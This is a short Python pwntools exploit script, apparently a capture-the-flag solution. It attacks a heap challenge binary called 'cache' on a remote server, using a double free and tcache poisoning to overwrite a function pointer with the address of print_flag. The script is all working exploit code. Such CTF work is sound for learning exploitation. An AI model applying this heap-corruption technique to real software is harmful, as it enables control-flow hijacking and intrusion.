from pwn import *

elf = ELF('./cache')
# io = process(elf.path)
io = remote('34.170.146.252', 45969)

def alloc(val):
    io.sendlineafter(b'opcode(0: alloc, 1: free): ', b'0')
    io.sendline(str(val).encode())
    
def free(ind):
    io.sendlineafter(b'opcode(0: alloc, 1: free): ', b'1')
    io.sendlineafter(b'what index to free: ', str(ind).encode())
    
io.recvuntil(b'address of print_flag: ')
print_flag_address = int(io.recvline().strip(), 16)
io.recvuntil(b'address of funcptr: ')
funcptr_address = int(io.recvline().strip(), 16)

alloc(0x1)
free(0)
free(0)
alloc(funcptr_address)
alloc(0x1)
alloc(print_flag_address)

io.interactive()
